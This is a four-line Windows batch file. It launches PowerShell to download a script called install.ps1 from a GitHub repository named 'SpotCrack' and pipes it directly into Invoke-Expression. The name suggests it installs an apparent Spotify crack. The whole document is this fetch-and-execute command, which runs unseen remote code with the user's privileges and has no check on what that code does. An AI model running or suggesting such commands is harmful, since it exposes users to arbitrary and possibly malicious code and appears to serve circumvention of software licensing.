@echo off
powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/Sn8ow/SpotCrack/release/install.ps1' | Invoke-Expression}"
pause
exit